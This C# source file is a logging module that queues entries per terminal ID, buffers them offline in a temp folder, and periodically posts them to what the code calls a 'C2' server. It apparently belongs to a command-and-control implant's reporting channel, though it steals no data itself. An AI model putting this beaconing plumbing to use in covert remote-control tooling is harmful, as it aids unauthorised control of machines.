using System;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Text;
using System.Web.Script.Serialization;
using System.Linq;

namespace XYZ.modules
{
    public enum LogLevel
    {
        Debug = 0,
        Info = 1,
        Warning = 2,
        Error = 3,
        Critical = 4
    }

    public class LogEntry
    {
        public DateTime Timestamp { get; set; }
        public LogLevel Level { get; set; }
        public string Module { get; set; }
        public string Message { get; set; }
        public string ExceptionType { get; set; }
        public string StackTrace { get; set; }
        public Dictionary<string, object> Context { get; set; }
        public string TerminalId { get; set; }

        public LogEntry()
        {
            Timestamp = DateTime.UtcNow;
            Context = new Dictionary<string, object>();
        }
    }

    public static class SecureLogger
    {
        private static readonly ConcurrentQueue<LogEntry> logQueue = new ConcurrentQueue<LogEntry>();
        private static readonly int MAX_QUEUE_SIZE = 5000;
        private static System.Threading.Timer sendTimer;
        private static string offlineLogPath;
        private static readonly object fileLock = new object();
        private static bool isInitialized = false;
        private static LogLevel minimumLogLevel = LogLevel.Info;
        private static bool isSending = false;

        public static void Initialize(string terminalId)
        {
            if (isInitialized) return;

            try
            {
                string logDir = Path.Combine(Path.GetTempPath(), "XYZ_Logs");
                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
                offlineLogPath = Path.Combine(logDir, "offline_buffer.json");

                // Check for existing offline logs and queue them immediately
                Task.Run(() => RecoverOfflineLogs());

                // Timer flush every 60 seconds
                sendTimer = new System.Threading.Timer(SendLogsCallback, null, TimeSpan.FromSeconds(10), TimeSpan.FromSeconds(60));

                isInitialized = true;
                LogInfo("SecureLogger", "Telemetry system initialized");
            }
            catch { }
        }

        private static void RecoverOfflineLogs()
        {
            lock (fileLock)
            {
                if (File.Exists(offlineLogPath))
                {
                    try
                    {
                        var lines = File.ReadAllLines(offlineLogPath);
                        var serializer = new JavaScriptSerializer();
                        foreach (var line in lines)
                        {
                            if (!string.IsNullOrEmpty(line))
                            {
                                try 
                                {
                                    var entry = serializer.Deserialize<LogEntry>(line);
                                    if (entry != null) EnqueueLog(entry);
                                }
                                catch {}
                            }
                        }
                        // Clear file after loading into memory queue
                        File.Delete(offlineLogPath);
                    }
                    catch { }
                }
            }
        }

        public static void SetMinimumLogLevel(LogLevel level)
        {
            minimumLogLevel = level;
        }

        public static void LogDebug(string module, string message, Dictionary<string, object> context = null)
        {
            Log(LogLevel.Debug, module, message, null, context);
        }

        public static void LogInfo(string module, string message, Dictionary<string, object> context = null)
        {
            Log(LogLevel.Info, module, message, null, context);
        }

        public static void LogWarning(string module, string message, Dictionary<string, object> context = null)
        {
            Log(LogLevel.Warning, module, message, null, context);
        }

        public static void LogError(string module, Exception exception, Dictionary<string, object> context = null)
        {
            string message = exception != null ? exception.Message : "";
            Log(LogLevel.Error, module, message, exception, context);
        }

        public static void LogCritical(string module, string message, Exception exception = null, Dictionary<string, object> context = null)
        {
            Log(LogLevel.Critical, module, message, exception, context);
        }

        private static void Log(LogLevel level, string module, string message, Exception exception = null, Dictionary<string, object> context = null)
        {
            if (level < minimumLogLevel) return;

            try
            {
                var entry = new LogEntry
                {
                    Level = level,
                    Module = module,
                    Message = message,
                    TerminalId = Program.GetTerminalId(),
                    Context = context ?? new Dictionary<string, object>()
                };

                if (exception != null)
                {
                    entry.ExceptionType = exception.GetType().Name;
                    if (!string.IsNullOrEmpty(exception.StackTrace))
                    {
                        entry.StackTrace = exception.StackTrace.Substring(0, Math.Min(500, exception.StackTrace.Length));
                    }
                }

                // Append vital telemetry
                entry.Context["Mem"] = GC.GetTotalMemory(false) / 1024 / 1024;
                
                EnqueueLog(entry);
            }
            catch { }
        }

        private static void EnqueueLog(LogEntry entry)
        {
            if (logQueue.Count >= MAX_QUEUE_SIZE)
            {
                LogEntry dummy;
                logQueue.TryDequeue(out dummy);
            }
            logQueue.Enqueue(entry);

            if (entry.Level == LogLevel.Critical)
            {
                Task.Run(() => SendLogsToC2());
            }
        }

        private static void SendLogsCallback(object state)
        {
            if (isSending) return;
            Task.Run(() => SendLogsToC2());
        }

        public static async Task SendLogsToC2()
        {
            if (logQueue.IsEmpty) return;
            isSending = true;

            List<LogEntry> batch = new List<LogEntry>();
            try
            {
                // Take up to 50
                LogEntry entry;
                while (batch.Count < 50 && logQueue.TryDequeue(out entry))
                {
                    batch.Add(entry);
                }

                if (batch.Count == 0) 
                {
                    isSending = false;
                    return;
                }

                var serializer = new JavaScriptSerializer();
                var payload = new
                {
                    terminal_id = Program.GetTerminalId(),
                    logs = batch,
                    timestamp = DateTime.UtcNow
                };

                string json = serializer.Serialize(payload);

                // Attempt send - Plain JSON for transparency/debugging per user request
                await ResilientC2Communication.PostData("api/logs", json);
                
                // Success: logs are gone from queue and sent. 
                // Any newly arrived logs will be picked up next cycle.
            }
            catch (Exception)
            {
                // If failed, save these logs to offline file
                SaveBatchToOfflineFile(batch);
            }
            finally
            {
                isSending = false;
            }
        }

        private static void SaveBatchToOfflineFile(List<LogEntry> batch)
        {
            try
            {
                lock (fileLock)
                {
                    var serializer = new JavaScriptSerializer();
                    using (StreamWriter sw = File.AppendText(offlineLogPath))
                    {
                        foreach (var entry in batch)
                        {
                            sw.WriteLine(serializer.Serialize(entry));
                        }
                    }
                }
            }
            catch { }
        }

        public static async Task FlushLogs()
        {
            await SendLogsToC2();
        }
    }
}
